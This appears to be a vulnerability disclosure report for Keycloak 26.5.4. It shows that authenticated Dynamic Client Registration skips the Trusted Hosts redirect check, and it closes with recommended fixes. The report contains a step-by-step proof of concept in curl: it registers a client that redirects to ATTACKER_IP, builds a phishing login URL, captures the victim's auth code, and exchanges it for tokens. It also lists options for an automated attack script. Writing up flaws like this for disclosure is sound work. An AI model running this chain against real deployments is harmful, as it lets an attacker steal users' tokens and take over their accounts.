# DCR Trusted Hosts Bypass — Token Theft via Phishing

## Summary

- Dynamic Client Registration (DCR) policy "Trusted Hosts" only applies to anonymous registrations. A user with the `create-client` role (realm-management) can register an OIDC client with any `redirect_uris` (including to an attacker-controlled server) via authenticated DCR. This enables a live phishing attack: the attacker generates a phishing URL from the real Keycloak domain, runs a capture server, waits for the victim to login, then automatically steals the victim's token.

## Vulnerability Type

- Broken Access Control / Privilege Escalation via Client Registration Policy Bypass

## Affected Component(s)

- DCR Endpoint (`/realms/{realm}/clients-registrations/openid-connect`)
- Client Registration Policy Engine (subType `authenticated` missing Trusted Hosts policy)

## Affected Version(s)

- Keycloak 26.5.4 (latest stable, reproduction confirmed)

## Keycloak Configuration Context (If Applicable)

- Default DCR policy configuration. The `Trusted Hosts` policy exists in subType `anonymous` but is **absent** from subType `authenticated`. The `create-client` role (realm-management) is typically delegated to developers for self-service client registration.

---

## Detailed Description

### End-to-End Attack Flow

```
Attacker (has create-client role)
    │
    ├─ 1. Login, obtain Bearer token
    ├─ 2. Register malicious client via DCR (redirect_uri → attacker's server)
    ├─ 3. Generate phishing URL (real Keycloak domain)
    ├─ 4. Start HTTP server to capture auth codes
    ├─ 5. Send phishing URL to victim
    │
    │  ┌─ Victim clicks phishing URL
    │  ├─ Sees the REAL Keycloak login page (100% legitimate)
    │  ├─ Logs in with their credentials
    │  └─ Redirected to attacker's server (auth code sent)
    │
    ├─ 6. Attacker's server captures auth code
    ├─ 7. Exchange auth code → access token + refresh token of victim
    └─ 8. Full access to victim's account
```

### Policy Analysis

Keycloak's DCR endpoint has two modes of operation:

- **`anonymous`** — No authentication; protected by the "Trusted Hosts" policy which validates redirect URIs.
- **`authenticated`** — Requires Bearer token; has a separate policy set.

The `Trusted Hosts` policy (which validates `redirect_uris`) **only exists in subType `anonymous`**. SubType `authenticated` has no URI validation whatsoever.

| Policy | subType `anonymous` | subType `authenticated` |
|---|---|---|
| Trusted Hosts (`client-uris-must-match`) | Enforced | **ABSENT** |
| Allowed Protocol Mapper Types | Enforced | Enforced |
| Allowed Client Scopes | Enforced | Enforced |
| Max Clients Limit | Enforced | Absent |
| Consent Required | Enforced | Absent |

### Privilege Boundary Verification

| Action | Endpoint | Result |
|---|---|---|
| `create-client` role → DCR with any redirect | `/realms/{realm}/clients-registrations/openid-connect` | **201 Created (SUCCESS)** |
| `create-client` role → Admin REST API | `/admin/realms/{realm}/clients` | **403 Forbidden (BLOCKED)** |
| Anonymous DCR with redirect to attacker | `/realms/{realm}/clients-registrations/openid-connect` | **403 "Trusted Hosts" rejected** |

The registered malicious client:
- **Immediately active** — no admin approval needed
- **Fully functional** — can initiate authorization code flow
- **Has a client secret** — attacker can exchange auth code for tokens

---

## Steps to Reproduce (Proof of Concept - PoC)

**Prerequisites:**
- Realm: `test`
- Attacker: `testuser / Password123` with `create-client` role
- Victim: `victim / Password123`
- **Two machines:** Machine A (KC server, admin access) and Machine B (attacker, no admin)

### Step 1 — Admin setup (Machine A — one-time)

Run the setup script on the KC server (or any machine with admin access):

```bash
python3 pocs/setup_dcr_admin.py --host http://localhost:8080 --realm test
```

Or manually via CLI:

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

RM_CLIENT=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients?clientId=realm-management" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

CREATE_ROLE=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients/$RM_CLIENT/roles/create-client")

curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "[$CREATE_ROLE]" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/role-mappings/clients/$RM_CLIENT"
```

### Step 2 — Attacker login and obtain token (Machine B — remote)

```bash
ATTACKER_TOKEN=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=webapp&grant_type=password&username=testuser&password=Password123&scope=openid" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
```

### Step 3 — Register malicious client with redirect to attacker's server

```bash
REG_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Authorization: Bearer $ATTACKER_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "client_name": "Aplikasi Resmi Perusahaan",
    "redirect_uris": ["http://ATTACKER_IP:48888/callback"],
    "grant_types": ["authorization_code","refresh_token"],
    "response_types": ["code"]
  }')
echo "$REG_RESP" | python3 -m json.tool
```

**Response (201 Created — WITHOUT Trusted Hosts rejection):**

```json
{
  "client_id": "425bebcb-4dc1-4467-adf1-6d20815712b3",
  "client_secret": "YDEWNkAWu6BanGdCamm8wGGZmHcWXz7D",
  "redirect_uris": ["http://ATTACKER_IP:48888/callback"],
  "grant_types": ["authorization_code", "refresh_token"]
}
```

### Step 4 — Control: Anonymous DCR (correctly rejected)

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/clients-registrations/openid-connect \
  -H "Content-Type: application/json" \
  -d '{"client_name":"anon-test","redirect_uris":["http://ATTACKER_IP:48888/callback"]}'
```

```json
{
  "error": "insufficient_scope",
  "error_description": "Policy 'Trusted Hosts' rejected request... Host not trusted."
}
```

### Step 5 — Start auth code capture server + Generate phishing URL

Attacker starts an HTTP listener server then generates the phishing URL:

```
http://46.101.162.187:8080/realms/test/protocol/openid-connect/auth?
  client_id=425bebcb-4dc1-4467-adf1-6d20815712b3&
  response_type=code&
  redirect_uri=http%3A%2F%2FATTACKER_IP%3A48888%2Fcallback&
  scope=openid+profile+email
```

This URL is 100% legitimate — real Keycloak domain. The victim has no reason to be suspicious.

### Step 6 — Victim clicks URL, logs in, auth code captured

Victim sees the real Keycloak login page. After logging in, Keycloak redirects to the attacker's server:

```
HTTP 302 → http://ATTACKER_IP:48888/callback?code=7e7cad47-b4b2-e780-9295-6dd0c51e7e9e...
```

The attacker's server automatically captures the auth code and displays a fake "Login Successful!" page to the victim.

### Step 7 — Attacker exchanges auth code for victim's token

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=$MAL_CLIENT_ID" \
  -d "client_secret=$MAL_SECRET" \
  -d "grant_type=authorization_code" \
  -d "code=$AUTH_CODE" \
  -d "redirect_uri=http://ATTACKER_IP:48888/callback"
```

**Victim's token successfully stolen:**

```
Username     : victim
Email        : victim@test.com
Full Name    : Victim User
Scope        : openid profile email
Access Token : eyJhbGciOiJSUzI1NiIsInR5cCI...
Refresh Token: eyJhbGciOiJIUzUxMiIsInR5cCI...
```

### Step 8 — Verify: access victim data

```bash
curl -s http://46.101.162.187:8080/realms/test/protocol/openid-connect/userinfo \
  -H "Authorization: Bearer $VICTIM_ACCESS_TOKEN"
```

```json
{
  "email_verified": true,
  "name": "Victim User",
  "preferred_username": "victim",
  "email": "victim@test.com"
}
```

### Automated PoC Script

**Files:**
- `pocs/setup_dcr_admin.py` — One-time admin setup (creates users, assigns roles)
- `pocs/poc_dcr_hijack.py` — Main attack script (runs from any machine)

**Setup (one-time, on KC server or any machine with admin access):**

```bash
python3 setup_dcr_admin.py --host http://localhost:8080
```

**Attack (from any machine — no admin needed):**

```bash
# With local listener (attacker has public IP):
python3 poc_dcr_hijack.py --host http://46.101.162.187:8080 --attacker-host ATTACKER_IP

# With webhook.site (attacker has no public IP):
python3 poc_dcr_hijack.py --host http://46.101.162.187:8080 --use-webhook

# Automated mode (simulate victim for testing):
python3 poc_dcr_hijack.py --host http://46.101.162.187:8080 --attacker-host 46.101.162.187 --auto-victim --timeout 30
```

**Parameters:**
- `--host` — Keycloak public URL (required)
- `--attacker-host` — Attacker's public IP/hostname for callback listener
- `--use-webhook` — Use webhook.site as callback (no public IP needed)
- `--listen-port` — Attacker's phishing server port (default: 48888)
- `--realm` — Target realm (default: test)
- `--timeout` — Timeout waiting for victim in seconds (default: 300)
- `--auto-victim` — Automatically simulate victim login (for testing/CI)

The attack script supports two callback modes:
- **Local listener** (`--attacker-host`): Runs an HTTP server on the attacker's machine to capture the auth code redirect
- **webhook.site** (`--use-webhook`): Uses webhook.site as the callback endpoint (no public IP needed)

The attack script uses ZERO admin API calls or localhost connections. It operates entirely through public Keycloak endpoints, making it a realistic remote attacker scenario.

---

## Impact

- **Full token theft:** A user with the `create-client` role can steal the token of any user in the realm, including administrators, by registering a malicious client and phishing via the real Keycloak login page.
- **No compromise indicators for the victim:** The login page is on the real Keycloak domain with HTTPS. There are no suspicious UI elements, no browser warnings.
- **Persistent access:** The stolen refresh token provides ongoing access until the victim changes their password.
- **Bypasses all redirect_uri allowlisting:** The `Trusted Hosts` protection configured by the admin does not apply to authenticated DCR.
- **Scales to all users in the realm:** A single malicious client registration can phish all users. The attacker only needs to distribute the URL.

---

## Recommendations

- **Apply the `Trusted Hosts` policy to subType `authenticated`.** The same URI validation must be enforced for authenticated registrations. This is the primary fix.
- **Require admin approval for DCR clients.** Add a `client-disabled` policy to the authenticated subType so new clients require admin activation before they can initiate auth flows.
- **Add URI domain validation to the `authenticated` policy set.** Restrict `redirect_uris` to pre-approved domains.
- **Audit clients already registered via DCR** for redirect URIs that should not be there.

## Supporting Material/References

- PoC video: *(to be added)*
- Source code: `pocs/poc_dcr_hijack.py`, `pocs/setup_dcr_admin.py`
